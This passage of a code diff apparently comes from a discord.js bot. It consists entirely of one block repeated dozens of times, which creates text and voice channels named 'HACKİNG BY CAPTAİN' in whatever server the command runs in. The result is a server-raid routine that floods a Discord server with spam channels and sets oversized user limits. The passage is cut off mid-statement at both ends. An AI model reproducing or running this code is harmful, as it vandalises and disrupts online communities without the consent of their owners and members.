+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
